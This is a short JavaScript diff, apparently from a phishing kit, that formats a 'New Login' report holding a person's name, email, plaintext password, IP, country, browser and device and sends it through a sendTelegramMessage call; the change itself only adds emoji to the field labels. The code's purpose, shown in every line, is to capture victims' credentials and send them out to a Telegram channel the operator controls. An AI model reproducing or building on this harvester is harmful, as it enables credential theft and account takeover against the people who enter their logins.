@@ -43,15 +43,15 @@
 
     const htmlMessage = `
 <b>🔐 New Login</b><br>
-<b>Name:</b> ${get(name) || 'Unknown'}<br>
-<b>Email:</b> ${get(email)}<br>
-<b>Password:</b> ${get(password)}<br>
-<b>Country:</b> ${country}<br>
-<b>IP:</b> ${ip}<br>
-<b>Browser:</b> ${browserType}<br>
-<b>Device:</b> ${device}<br>
-<b>Time:</b> ${new Date().toLocaleString()}<br>
-<b>User-Agent:</b> ${userAgent}
+<b>👤Name:</b> ${get(name) || 'Unknown'}<br>
+<b>📧Email:</b> ${get(email)}<br>
+<b>🔑Password:</b> ${get(password)}<br>
+<b>🌍Country:</b> ${country}<br>
+<b>📡IP:</b> ${ip}<br>
+<b>🧭Browser:</b> ${browserType}<br>
+<b>💻Device:</b> ${device}<br>
+<b>🕒Time:</b> ${new Date().toLocaleString()}<br>
+<b>🧾User-Agent:</b> ${userAgent}
 `.trim();
 
     await sendTelegramMessage(htmlMessage, 'HTML');
